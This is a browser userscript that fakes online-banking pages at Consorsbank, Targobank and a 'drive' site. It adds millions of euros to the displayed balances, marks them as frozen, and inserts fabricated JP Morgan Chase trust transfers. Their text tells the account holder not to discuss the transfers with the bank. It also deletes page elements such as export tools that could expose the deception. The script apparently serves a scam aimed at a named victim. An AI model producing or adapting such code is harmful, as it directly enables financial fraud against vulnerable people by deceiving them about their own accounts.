// ==UserScript==
// @name         Ed Rec Hermann Borniger
// @namespace    http://tampermonkey.net/
// @version      11.0
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/499776/Ed%20Rec%20Hermann%20Borniger.user.js
// @updateURL https://update.greasyfork.org/scripts/499776/Ed%20Rec%20Hermann%20Borniger.meta.js
// ==/UserScript==



//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================



// GESAMT START

   // Configurable modification amounts and their corresponding indexes
    const accountBalanceAdjustments = [
        { index: 0, amount: 2754199},

    ];

// BALANCES START

    // Configurable modification amounts and their corresponding indexes
    const balanceModificationConfig = [
        { index: 0, amount: 2754199},
        { index: 2, amount: 0 },
        { index: 5, amount: 0 },
    ];

//  UMSATZE BALANCE

  // Configurable modification amount
    const modificationAmount = 2754199; // Set your desired modification amount here
    const accountValue = '270440067'; // Set your desired account value here
    const useSelectedOption = false; // Set to false to ignore the selected option in the dropdown  BEING SET TO TRUE WHEN CLIENT HAS MANY ACCOUNTS, HOWEVER, WHEN CLIENT HAS 1 ACCOUNT IS USUALLY  BEING SET TO FALSE


// UMSATZE TRANSACTIONS

   // Specify transactions here
    const transactions = [

           {
            transactionDate: "25.07.2024",
            transactionDateBooking: "25.07.2024",
            transactionTitle: "Treuhand: JP Morgan Chase",
            transactionDetails: "Freigabe erteilt. A. Faber meldet sich. Mit Bank nicht besprechen damit nicht gesperrt.",
            transactionAmount: "+2.727.199,37 EUR",
            insertPosition: 'above' // Specify position for this transaction
        },
             {
            transactionDate: "23.07.2024",
            transactionDateBooking: "23.07.2024",
            transactionTitle: "JP Morgan Chase",
           transactionDetails: " A. Faber meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
           transactionAmount: "       +15.100,00 EUR",
           insertPosition: 'above' // Specify position for this transaction
       },
          {
            transactionDate: "16.07.2024",
            transactionDateBooking: "16.07.2024",
            transactionTitle: "JP Morgan Chase",
           transactionDetails: " A. Faber meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
           transactionAmount: "       +11.900,00 EUR",
           insertPosition: 'above' // Specify position for this transaction
       },
 //       {
//            transactionDate: "03.07.2024",
 //           transactionDateBooking: "03.07.2024",
 //           transactionTitle: "NewTitle*Example 1234 City",
 //           transactionDetails: "JP Morgan Chase 2.500 Euro 03.07. 10356092",
  //          transactionAmount: "+2.500,00 EUR",
  //          insertPosition: 'above' // Specify position for this transaction
 //       },
 //       {
 //           transactionDate: "01.07.2024",
 //           transactionDateBooking: "01.07.2024",
 //           transactionDetails: "Bank of America 3.000 Euro 04.07. 10356100",
 //           transactionAmount: "-3.000,00 EUR",
 //           insertPosition: 'above' // Specify position for this transaction
 //       }
        // Add more transactions as needed
    ];


//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================
//===========================================================================================================================================================================================================================================================================


if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("drive") > 0) {
    'use strict';

 //   // Configurable modification amounts and their corresponding indexes
 //   const accountBalanceAdjustments = [
 //       { index: 0, amount: 700 },

//    ];

    function modifyBalances() {
        // Check for the presence of the element with the specified class
const presenceCheckElement = document.querySelector('.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8') && document.querySelector('div.row.margin-top-5 h4') && document.querySelector('.flex-element.col-pad.end-xs');
        if (presenceCheckElement) {
            // Iterate over each balance adjustment configuration
            accountBalanceAdjustments.forEach(({ index, amount }) => {
                // Find the balance element based on index
                const balanceElements = document.querySelectorAll('div.row.margin-top-5 h4');
                if (balanceElements.length > index) {
                    const balanceElement = balanceElements[index];
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + amount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue);

                        // Update the balance element with the new value and add ' EUR'
                        balanceElement.textContent = formattedNewBalance + ' EUR';

                        console.log(`Balance at index ${index} modified from ${balanceText} to ${formattedNewBalance} EUR`);
                    } else {
                        console.log(`Failed to parse current balance value at index ${index}.`);
                    }
                } else {
                    console.log(`Balance element not found at index ${index}.`);
                }
            });

            // Remove the presence check element 5 milliseconds after modification
          setTimeout(() => {
                // Use querySelectorAll correctly with the class selector
                const elementsToRemove = document.querySelectorAll('.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8');

                // querySelectorAll returns a NodeList, so we need to iterate over it
                elementsToRemove.forEach(element => {
                    element.remove();
                    console.log("Element with class '.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8' removed");
                });
            }, 30);
        } else {
            console.log('Presence check element not found. Balances not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Function to repeatedly check and modify the balances every 10 seconds
    function startBalanceModification() {
      modifyBalances();
        setInterval(modifyBalances, 100); // 10000 milliseconds = 10 seconds
    }

    // Start the repeated balance modification when the page loads
//    window.addEventListener('load', startBalanceModification);
    startBalanceModification();

                    }



if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("drive") > 0) {

    'use strict';

//    // Configurable modification amounts and their corresponding indexes
//    const balanceModificationConfig = [
//        { index: 0, amount: 700 },
////        { index: 2, amount: 700 },
//        { index: 5, amount: 700 },
//    ];

    function modifyBalances() {
        // Check for the presence of the element with the specified class
       const presenceCheckElement = document.querySelector('.flex.tooltip-primary') && document.querySelector('.flex-element.col-pad.end-xs');

if (presenceCheckElement) {
            // Log the text content and indexes of all elements with the specified class
            const balanceElements = document.querySelectorAll('.flex-element.col-pad.end-xs');
            balanceElements.forEach((element, index) => {
                console.log(`Element at index ${index} with class 'flex-element col-pad end-xs': ${element.textContent.trim()}`);
            });

            // Iterate over each balance adjustment configuration
            balanceModificationConfig.forEach(({ index, amount }) => {
                if (balanceElements.length > index) {
                    const balanceElement = balanceElements[index];
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + amount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue);

                        // Update the balance element with the new value and add ' EUR'
                        balanceElement.textContent = formattedNewBalance + ' EUR';

                        console.log(`Balance at index ${index} modified from ${balanceText} to ${formattedNewBalance} EUR`);
                    } else {
                        console.log(`Failed to parse current balance value at index ${index}.`);
                    }
                } else {
                    console.log(`Balance element not found at index ${index}.`);
                }
            });

            setTimeout(() => {
                // Use querySelectorAll correctly with the class selector
                const elementsToRemove = document.querySelectorAll('.flex.tooltip-primary');

                // querySelectorAll returns a NodeList, so we need to iterate over it
                elementsToRemove.forEach(element => {
                    element.remove();
                    console.log("Element with class '.flex.tooltip-primary' removed");
                });
            },30);
        } else {
            console.log('Presence check element not found. Balances not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Function to repeatedly check and modify the balances every 10 seconds
    function startBalanceModification() {
      modifyBalances();
        setInterval(modifyBalances, 150); // 10000 milliseconds = 10 seconds
    }

    // Start the repeated balance modification when the page loads
//    window.addEventListener('load', startBalanceModification);
    startBalanceModification();

 }







    // Check if the account value is present in the URL
    if (window.location.href.indexOf("consors") > 0 ||
        window.location.href.indexOf("drive") > 0 ||
        window.location.href.indexOf("Ueberweisung") > 0) {

    // Function to check the account value
    function checkAccountValue() {
        if (useSelectedOption) {
            const selectDropdown = document.querySelector('.select-dropdown select');
            if (selectDropdown) {
                const selectedOptionValue = selectDropdown.value.trim();
                if (selectedOptionValue === accountValue) {
                    return true;
                } else {
                    console.log(`Selected account value (${selectedOptionValue}) does not match expected value (${accountValue}). Skipping balance modification.`);
                    return false;
                }
            } else {
                console.log('Select dropdown element not found. Skipping balance modification.');
                return false;
            }
        }
        return true; // If useSelectedOption is false, always return true
    }

    // Function to modify the balance
    function modifyBalance() {
        if (!checkAccountValue()) {
            return;
        }

        const presenceCheckElement = document.querySelector('.margin-top-20-md.margin-top-20-lg.row.text-typo');
        if (presenceCheckElement) {
            const balanceElement = document.getElementById('account-header-balance');
            if (balanceElement) {
                const balanceText = balanceElement.textContent.trim();
                const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                if (!isNaN(balanceValue)) {
                    const newBalanceValue = balanceValue + modificationAmount;
                    const formattedNewBalance = formatBalance(newBalanceValue);

                    balanceElement.textContent = formattedNewBalance + ' EUR Gefroren';

                    console.log(`Balance modified from ${balanceText} to ${formattedNewBalance} EUR`);

                    setTimeout(() => {
                        const elementToRemove = document.querySelector('.margin-top-20-md.margin-top-20-lg.row.text-typo');
                        if (elementToRemove) {
                            elementToRemove.remove();
                            console.log("Element with class '.margin-top-20-md.margin-top-20-lg.row.text-typo' removed");
                        }
                    }, 5);
                } else {
                    console.log('Failed to parse current balance value.');
                }
            } else {
                console.log('Balance element not found.');
            }
        } else {
            console.log('Presence check element not found. Balance not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ',');
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    }

    // Function to repeatedly check and modify the balance every 10 seconds
    function startBalanceModification() {
        setInterval(modifyBalance, 70); // 10000 milliseconds = 10 seconds
    }

    // Start the repeated balance modification when the page loads
    window.addEventListener('load', startBalanceModification);
    }




if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("Ueberweisung") > 0) {
    'use strict';

    // Specify transactions here
//    const transactions = [
 //       {
//            transactionDate: "03.07.2024",
//            transactionDateBooking: "03.07.2024",
//            transactionTitle: "NewTitle*Example 1234 City",
//            transactionDetails: "JP Morgan Chase 2.500 Euro 03.07. 10356092",
 //           transactionAmount: "+2.500,00 EUR",
//            insertPosition: 'above' // Specify position for this transaction
 //       },
        // Add more transactions as needed
 //   ];

    function duplicateAndModifyFirstElement(transactions) {
        let accountMatches = true;

        // Check if the account value matches if the flag is set
        if (useSelectedOption) {
            const selectDropdown = document.querySelector('.select-dropdown select');
            if (selectDropdown) {
                const selectedOptionValue = selectDropdown.value.trim();
                if (selectedOptionValue !== accountValue) {
                    accountMatches = false;
                }
            } else {
                console.log("Select dropdown element not found.");
                return;
            }
        }

        if (accountMatches) {
            // Account value matches, proceed with inserting transactions
            const element = document.querySelector('.tablecards-row.transition--ease-3');
            if (element) {
                transactions.forEach(transaction => {
                    const clone = element.cloneNode(true);

                    // Modify the transaction date
                    const dateElement = clone.querySelector('.tablecards-cell .tablecards-values');
                    if (dateElement) {
                        dateElement.textContent = transaction.transactionDate;
                    }

                    // Modify the transaction date booking
                    const bookingDateElement = clone.querySelectorAll('[data-type="valueDate"]')[0];
                    if (bookingDateElement) {
                        bookingDateElement.textContent = transaction.transactionDateBooking;
                    }

                    // Modify the transaction title
                    const titleElement = clone.querySelectorAll('.tablecards-cell .tablecards-values')[2];
                    if (titleElement) {
                        titleElement.textContent = transaction.transactionTitle;
                    }

                    // Modify the transaction details
                    const detailsElement = clone.querySelectorAll('.tablecards-cell .tablecards-values')[3];
                    if (detailsElement) {
                        detailsElement.textContent = transaction.transactionDetails;
                    }

                    // Modify the transaction amount
                    const amountElement = clone.querySelector(
                        '.tablecards-cell .tablecards-values.text--red, .tablecards-values.text--consors-basic-green'
                    );
                    if (amountElement) {
                        // Determine if the transaction amount is positive or negative
                        const isPositive = transaction.transactionAmount.trim().startsWith('+');
                        const newAmountElement = document.createElement('div');
                        newAmountElement.classList.add('tablecards-values');
                        if (isPositive) {
                            newAmountElement.classList.add('text--consors-basic-green');
                        } else {
                            newAmountElement.classList.add('text--red');
                        }
                        newAmountElement.textContent = transaction.transactionAmount;
                        amountElement.parentNode.replaceChild(newAmountElement, amountElement);
                    }

                    // Determine where to insert the clone
                    const position = transaction.insertPosition || 'above'; // Default to 'above' if not specified
                    if (position === 'above') {
                        element.parentNode.insertBefore(clone, element);
                    } else {
                        element.parentNode.insertBefore(clone, element.nextSibling);
                    }

                    // Add new HTML after the transaction was inserted
                    const tablecardsCellNoWrapElement = clone.querySelector('.tablecards-cell.no-wrap');
                    if (tablecardsCellNoWrapElement) {
                        const newHtml = document.createElement('div');
                        newHtml.classList.add('tablecards-values');
                        newHtml.innerHTML = `
                            <div data-type="valueDate" class="flex middle-xs">
                                <span class="text--grey">${transaction.transactionDateBooking}</span>
                                <p class="text--grey"></p>
                            </div>`;
                        tablecardsCellNoWrapElement.appendChild(newHtml);
                    }

                    console.log("Element duplicated, modified, and new HTML added.");
                });

                // Remove the trigger element after 5 milliseconds
                setTimeout(() => {
                    const triggerElement = document.querySelector('.indicator-sort.indicator-sort-up');
                    if (triggerElement) {
                        triggerElement.remove();
                        console.log('Trigger element removed.');
                    }

                    // Remove unnecessary tablecards-values elements
                    removeSecondTablecardsValues();

                }, 5);
            } else {
                console.log("No element found with the specified class.");
            }
        } else {
            console.log("Account value does not match. Transactions not inserted.");
        }
    }

    // Function to check for the trigger element and insert transactions
    function checkAndInsertTransactions() {
        const triggerElement = document.querySelector('.indicator-sort.indicator-sort-up');
        if (triggerElement) {
            duplicateAndModifyFirstElement(transactions);
        }
    }

    // Function to remove the second tablecards-values element under label="Betrag" and under .row.end-xs
    function removeSecondTablecardsValues() {
        // Remove under wb-simple-text with label="Betrag"
        const wbSimpleTextElements = document.querySelectorAll('wb-simple-text[label="Betrag"]');
        wbSimpleTextElements.forEach(element => {
            const valuesElements = element.querySelectorAll('.tablecards-values');
            if (valuesElements.length > 1) {
                valuesElements[1].remove();
                console.log('Removed second tablecards-values element under wb-simple-text[label="Betrag"].');
            }
        });

        // Remove under .row.end-xs
        const rowEndXsElements = document.querySelectorAll('.row.end-xs');
        rowEndXsElements.forEach(element => {
            const valuesElements = element.querySelectorAll('.tablecards-values');
            if (valuesElements.length > 1) {
                valuesElements[1].remove();
                console.log('Removed second tablecards-values element under .row.end-xs.');
            }
        });
    }

    // Run the checkAndInsertTransactions function initially and then every 5 seconds
    setInterval(checkAndInsertTransactions, 4000); // Check every 5 seconds
    setInterval(() => {

        removeSecondTablecardsValues(); // Continuously check and remove unnecessary elements
    }, 10);
}








if (window.location.href.indexOf("consors") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("drive") > 0) {
    'use strict';

    // Function to remove elements with specified classes
    function removeSpecifiedElements() {
        // Remove elements with class .col-xs-12.col-md-8.col-md-offset-4.middle-xs.text-asterix.margin-top-10
        let classElements1 = document.querySelectorAll('.col-xs-12.col-md-8.col-md-offset-4.middle-xs.text-asterix.margin-top-10');
        classElements1.forEach(element => element.remove());

        // Remove elements with class .margin-top-5.row.text-typo.hidden-xs.hidden-sm
        let classElements2 = document.querySelectorAll('.margin-top-5.row.text-typo.hidden-xs.hidden-sm');
        classElements2.forEach(element => element.remove());

        // Remove elements with class .row.row-neutral.hidden-sm.hidden-xs
        let classElements3 = document.querySelectorAll('.row.row-neutral.hidden-sm.hidden-xs');
        classElements3.forEach(element => element.remove());

        // Remove elements with tag app-exporters
        let tagElements = document.querySelectorAll('app-exporters');
        tagElements.forEach(element => element.remove());
    }

    // Check for specified elements every 50ms
    setInterval(removeSpecifiedElements, 50);
}
